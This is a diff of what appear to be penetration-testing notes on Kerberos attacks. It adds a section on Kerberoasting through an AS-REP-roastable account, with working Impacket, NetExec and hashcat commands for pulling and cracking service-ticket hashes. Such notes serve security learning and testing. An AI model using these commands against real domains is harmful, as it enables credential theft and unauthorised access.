@@ -7,10 +7,6 @@
 
 # <span style="color:#FF5555">Explanation</span>
 
-> [!info] Variables used below
-> - `$DC_IP` – Domain Controller's IP
-> - `$DOMAIN` – target domain name
-
 ### <span style="color:#50FA7B">Normal Kerberos Authentication Flow</span>
 
 - **AS-REQ (Authentication Service Request):** The client requests a Ticket Granting Ticket (TGT) from the Key Distribution Center / Domain Controller (KDC/DC).
@@ -112,3 +108,27 @@ hashcat -m 18200 ./as-rep.txt /home/kali/Documents/password.txt
 ```
 
 ![[Pasted image 20260415151946.png]]
+
+
+# <span style="color:#FF5555">Can't crack the hash? Kerberoast *through* the AS-REP account</span>
+
+If an account is AS-REP roastable but its hash won't crack, you can still use that account (no password needed) to request TGS tickets for SPN accounts and Kerberoast them.
+
+### <span style="color:#50FA7B">Method 1 — Impacket GetUserSPNs (`-no-preauth`)</span>
+```bash
+GetUserSPNs.py -no-preauth "asrep_user" -usersfile spn_targets.txt \
+  -dc-host dc.$DOMAIN $DOMAIN/ -outputfile roasted.txt
+```
+- `asrep_user` = the pre-auth-disabled account (no password needed).
+- `spn_targets.txt` = candidate usernames that hold SPNs (you supply these).
+- Output = TGS-REP hashes to crack.
+
+### <span style="color:#50FA7B">Method 2 — NetExec</span>
+```bash
+nxc ldap dc.$DOMAIN -u asrep_user -p '' --kerberoasting roasted.txt
+```
+
+### <span style="color:#50FA7B">Then crack</span>
+```bash
+hashcat -m 13100 roasted.txt rockyou.txt   # TGS-REP (Kerberoast)
+```
